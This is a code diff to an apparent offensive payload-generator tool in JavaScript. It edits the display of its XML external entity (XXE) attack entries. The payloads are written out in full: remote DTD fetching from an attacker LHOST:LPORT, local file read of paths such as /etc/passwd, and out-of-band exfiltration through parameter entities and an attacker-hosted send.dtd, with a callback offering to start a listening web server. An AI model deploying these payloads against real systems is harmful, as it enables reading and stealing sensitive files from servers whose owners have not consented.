@@ -11,8 +11,6 @@ var M = require('mstring')
 var web = require("../modules/webserver.js")
 
 
-
-
 // Payload Array
 arrayInjection = []
 
@@ -20,11 +18,11 @@ arrayInjection = []
 
 // ########## XXE Attacks
 
+
 arrayInjection.push({
 	title: "Remote DTD File Parsing",
-	description: "-"+options(" LHOST=<lhost>, LPORT=<lport>"),
 	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://$$LHOST$$:$$LPORT$$'>",
-	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<lhost>:<lport>'>",
+	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://"+red("<lhost>")+":"+red("<lport>")+"'>",
 	category: "XML",
 	callback: function(returnToPrepare){
 		prompt.message = "Should I fire up a web server for you? (Y/n)"
@@ -42,11 +40,11 @@ arrayInjection.push({
 	}
 })
 
+
 arrayInjection.push({
 	title: "XXE (Local File Read)",
-	description: "-"+options(" PROMPT=<remote file path>"),
 	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://$$PROMPT$$\"> ]]>&bar;",
-	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<remote file path>\"> ]]&bar;>",
+	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<remote file path>\"> ]]&bar;>",
 	category: "XML",
 	callback: function(returnToPrepare){
 		prompt.message = "Specify a local file (/etc/passwd , C:\\Windows\\win.ini) :"
@@ -58,9 +56,9 @@ arrayInjection.push({
 
 arrayInjection.push({
 	title: "XXE (Local File Exfiltration using parameter entities)",
-	description: "-"+options(" LHOST=<lhost>, LPORT=<lport>, PROMPT=<remote file path>")+log.blackBright("\nLocally hosted send.dtd should contain the following: <!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://<lhost>:<lport>/?%file;'>\"> %all;"),
+	// description: "-"+options(" LHOST=<lhost>, LPORT=<lport>, PROMPT=<remote file path>")+log.blackBright("\nLocally hosted send.dtd should contain the following: <!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://<lhost>:<lport>/?%file;'>\"> %all;"),
 	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://$$PROMPT$$\"><!ENTITY % dtd SYSTEM \"http://$$LHOST$$:$$LPORT$$/send.dtd\">%dtd;%send; ]]>",
-	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<remote file path>\"><!ENTITY % dtd SYSTEM \"http://<lhost>:<lport>/send.dtd\">%dtd;%send; ]]>",
+	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<remote file path>\"><!ENTITY % dtd SYSTEM \"http://<lhost>:<lport>/send.dtd\">%dtd;%send; ]]>",
 	category: "XML",
 	callback: function(returnToPrepare){
 		prompt.message = "Specify a local file (/etc/passwd , C:\\Windows\\win.ini) :"
